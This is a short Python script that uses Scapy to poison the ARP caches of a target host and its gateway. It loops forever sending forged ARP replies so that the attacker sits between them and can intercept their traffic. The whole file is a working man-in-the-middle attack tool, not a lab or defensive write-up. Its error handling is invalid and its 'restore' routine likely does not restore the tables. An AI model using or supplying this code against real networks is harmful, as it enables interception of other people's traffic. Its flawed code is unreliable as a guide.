from scapy.all import ARP, Ether, send, conf
import time
from router_ip_mac import get_router_ip
from sniffer import get_target_ip, get_mac

# Disable Scapy's SSL verification
conf.verb = 0  # Disable verbose output

def arp_poison(target_ip, target_mac, spoof_ip):
    arp_response = ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
    ether = Ether(dst=target_mac) / arp_response
    send(ether)




try:
    target_ip = get_target_ip()
    gateway_ip = get_router_ip()
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)


    print(f"Target MAC: {target_mac}, Gateway MAC: {gateway_mac}")
    while True:
        # Poison the target
        arp_poison(target_ip, target_mac, gateway_ip)
        # Poison the gateway
        arp_poison(gateway_ip, gateway_mac, target_ip)
        time.sleep(2)  # Send every 2 seconds
except KeyboardInterrupt:
    print("Restoring ARP tables. . .")
    for i in range(4):
        arp_poison(target_ip, target_mac, target_ip)
        arp_poison(gateway_ip, gateway_mac, gateway_ip)
        time.sleep(2)
    print("ARP tables restored.")
except target_mac is None:
    print("Could not find target MAC")
except gateway_mac is None:
    print("Could not find gateway MAC")
except gateway_ip is None:
    print("Could not find gateway IP")
except target_ip is None:
    print("Target IP doesn't exist")
